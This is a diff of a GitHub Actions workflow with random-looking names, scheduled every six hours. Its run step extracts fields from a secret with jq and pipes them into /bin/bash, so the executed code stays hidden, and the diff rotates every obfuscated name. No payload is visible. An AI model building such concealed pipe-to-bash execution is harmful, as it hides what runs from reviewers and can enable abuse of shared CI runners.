@@ -1,24 +1,25 @@
 name: caijingcheng0987
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 2/6 * * *'
+    - cron: '9 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caijingcheng0987
         env:
-          s49106: ${{ secrets.s49106 }}
+          vqb5260: ${{ secrets.vqb5260 }}
         run: |
-          echo $s49106 | jq -r .nyqoz7 | /bin/bash
-          echo $bh28 | jq -r .xfb6 | /bin/bash
-          echo $bod8 | jq -r .vn465 | /bin/bash
-          echo $w4 | jq -r .uay1997 | /bin/bash
-          echo $qqin08 | jq -r .zls7 | /bin/bash
-          echo $k1484 | jq -r .tbem68 | /bin/bash
-          echo $e2 | jq -r .cbzc229 | /bin/bash
+          echo $vqb5260 | jq -r .s222 | /bin/bash
+          echo $mylco4 | jq -r .dh26305 | /bin/bash
+          echo $ahft46501 | jq -r .hgt04 | /bin/bash
+          echo $h03 | jq -r .nwyuk917 | /bin/bash
+          echo $p168 | jq -r .o38 | /bin/bash
+          echo $mzayo057 | jq -r .ywr721 | /bin/bash
+          echo $d1 | jq -r .ux64458 | /bin/bash
+          echo $fqbci111 | jq -r .eppc4791 | /bin/bash
 
